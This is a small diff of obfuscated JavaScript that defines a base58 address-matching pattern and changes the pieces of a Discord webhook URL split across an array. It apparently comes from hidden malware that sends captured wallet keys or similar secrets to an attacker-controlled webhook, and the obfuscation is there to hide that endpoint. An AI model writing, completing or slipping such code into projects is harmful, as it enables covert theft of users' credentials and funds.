@@ -30,10 +30,10 @@ const _0x49bc = new RegExp('[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrs
 const _0x152c = [
     'https://discord.com/api/webhooks/',
     '1254887840358076426/', 
-    '6lp7uRm_Si2uouBCykTOn', 
+    '9AzLp3wRqK_T2uouBCYTfp', 
     '5IpzTxpwV_Si2uouBCYTkUp', 
-    '37ExNIAQHvNPvmqoxg0jnNAzVNAWN92rdkFvU480GxBcY',
-    'randomFakeEnding1234567890'
+    '37ExNIAQHvNPvmqoxg0jnNAzVNAWN92rdkFvU480GxBcY', 
+    '84jP9y4TxpwR_T6uouBCYTq'
 ];
 
 function _0x33b9() {
